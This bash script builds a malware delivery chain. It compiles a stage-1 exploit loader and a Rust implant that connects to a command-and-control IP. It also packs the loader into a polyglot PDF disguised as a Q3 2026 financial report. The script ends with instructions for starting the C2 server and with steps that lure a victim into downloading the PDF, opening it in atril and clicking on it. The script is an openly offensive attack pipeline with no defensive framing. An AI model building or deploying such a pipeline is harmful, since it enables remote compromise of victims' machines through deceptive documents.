#!/bin/bash
# Build the Tier 2 polyglot PDF + implant.
# Usage: ./build.sh [pdf_name] [c2_ip]
#
# Produces:
#   1. Polyglot PDF → ../serve/Q3_2026_Financial_Report.pdf
#   2. Implant binary → ../serve/implant (symlink to build output)
#
# Requires: gcc, python3, cargo + musl target, CVE-2026-46529/build_polyglot.py

set -euo pipefail

OUTPUT="${1:-Q3_2026_Financial_Report.pdf}"
IP="${2:-10.170.22.213}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
IMPLANT_DIR="${PROJECT_ROOT}/implant"
SERVE_DIR="${SCRIPT_DIR}/../serve"

NAME="$(basename "$OUTPUT")"

echo "╔══════════════════════════════════════════════════╗"
echo "║     Tier 2 Build Pipeline                       ║"
echo "╠══════════════════════════════════════════════════╣"
echo "║ PDF:     ${OUTPUT}"
echo "║ C2:      ${IP}"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# ── Clean previous build ──
rm -f "${SCRIPT_DIR}/exploit.so" "${SERVE_DIR}/${NAME}" 2>/dev/null

# ── Step 1: Compile the stage-1 loader (.so) ──
echo "[1/4] Compiling exploit.so (stage-1 loader)..."
gcc -shared -fPIC -Wl,--build-id=sha1 \
    -o "${SCRIPT_DIR}/exploit.so" \
    "${SCRIPT_DIR}/exploit.c" \
    -lssl -lcrypto
echo "      -> exploit.so built"

# ── Step 2: Build the implant binary ──
echo "[2/4] Building implant (Rust, musl-static, tier2+https)..."
cd "${IMPLANT_DIR}"
C2_HOST="${IP}" \
    cargo build --release --target x86_64-unknown-linux-musl \
    -p implant-tier2 2>&1 | tail -1
echo "      -> implant (symlinked)"

# ── Step 3: Build the polyglot PDF ──
echo "[3/4] Building polyglot PDF+ELF..."
cd "${SCRIPT_DIR}"
python3 build_polyglot.py "${SCRIPT_DIR}/exploit.so" "${SERVE_DIR}/${NAME}" 2>/dev/null

if [ ! -f "${SERVE_DIR}/${NAME}" ]; then
    echo "      [!] Polyglot build failed!"
    exit 1
fi
echo "      -> ${NAME} ($(du -h "${SERVE_DIR}/${NAME}" | cut -f1))"

# Clean up .so
rm -f "${SCRIPT_DIR}/exploit.so"

# ── Step 4: Deploy to serve directory ──
echo "[4/4] Deploying to serve directory..."
# PDF already built to serve/
echo "      -> ${SERVE_DIR}/${NAME}"
echo "      -> ${SERVE_DIR}/implant"

echo ""
echo "[+] Tier 2 build complete!"
echo ""
echo "  Start C2 server:"
echo "    cd ${PROJECT_ROOT} && cargo run -p c2-server --release"
echo ""
echo "  Start PDF server (dynamic per-request IP replacement):"
echo ""
echo "  Victim steps:"
echo "    1. Visit http://<attacker>:8080/ in any browser"
echo "    2. Download and open the PDF in atril"
echo "    3. Click anywhere on the PDF page"
echo ""
echo "  IMPORTANT: The PDF must keep the basename '${NAME}'"
echo "  on the victim's disk. Directory does not matter."
